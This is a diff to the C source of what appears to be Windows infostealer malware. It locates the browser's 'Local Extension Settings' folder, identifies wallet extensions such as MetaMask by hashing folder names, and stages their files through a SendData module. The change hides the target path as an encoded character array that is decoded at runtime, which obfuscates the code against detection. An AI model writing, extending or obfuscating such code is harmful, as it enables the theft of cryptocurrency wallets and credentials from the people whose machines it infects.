@@ -8,11 +8,12 @@
 #include "../include/ntdll.h"
 #include "../include/SendData.h"
 #include "../include/FileIO.h"
+#include "../include/decoding.h"
 
 #include <windows.h>
 
 
-void PrepareForSend(unsigned short *path, unsigned short *FolderName, unsigned short *ExtentionFolder) {
+void PrepareForSend(unsigned short *path, unsigned short *FolderName, unsigned short *ExtentionMark) {
     unsigned short      TempPath[250]       = {0};
     unsigned char       FolderItems[4096]   = {0};
     int                 PathSize            =  lenW(path);
@@ -47,7 +48,7 @@ void PrepareForSend(unsigned short *path, unsigned short *FolderName, unsigned s
             int                 TempPathSize        = lenW(TempPath);
 
 
-            ConcatStringW(FullFileName, ExtentionFolder, 0);
+            ConcatStringW(FullFileName, ExtentionMark, 0);
             ConcatStringW(FullFileName, FileName, 2);
 
             MovMemory(TempPath, FileAndPath, TempPathSize * 2);
@@ -80,13 +81,15 @@ void PrepareForSend(unsigned short *path, unsigned short *FolderName, unsigned s
 }
 
 
-void ExtensionsGrabber(unsigned short *path) {
+void GrabExtensions(unsigned short *path) {
     unsigned short      TempPath[250]       = {0};
+    unsigned short      ExtentionsPath[34]  = {0x0061, 0x009b, 0x0078, 0x00b8, 0x0075, 0x00c2, 0x0094, 0x00b8, 0x008c, 0x0078, 0x008f, 0x00b2, 0x0075, 0x00b9, 0x003f, 0x0046, 0x00bc, 0x00a8, 0x00a5, 0x0093, 0x00bc, 0x0093, 0x00ae, 0x009e, 0x005e, 0x0071, 0x009a, 0x00a4, 0x00b8, 0x0099, 0x00a7, 0x009c, 0x00a5, 0x0000};
     unsigned char       FolderItems[4096]   = {0};
     int                 PathSize            =  lenW(path);
 
+    DecodeStringW(ExtentionsPath);
     MovMemory(path, TempPath, PathSize * 2);
-    ConcatStringW(TempPath, L"\\Default\\Local Extension Settings", PathSize);
+    ConcatStringW(TempPath, ExtentionsPath, PathSize);
 
 
     if (ReadFolder(FolderItems, TempPath) != 0) {
@@ -98,11 +101,11 @@ void ExtensionsGrabber(unsigned short *path) {
     while (TRUE) {
         unsigned short FolderName[100] = {0};
 
+        /*we move 64 because a valid extention folder is 32 and we have to multiply it by 2 since its wide character array*/
         MovMemory(FileInfo->FileName, FolderName, 64);
         FolderName[32] = 0x0000;
 
         if (FileInfo->FileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
-
             switch (HashStrW(FolderName)) {
             case METAMASK:
                 PrepareForSend(TempPath, FolderName, L"a\\");
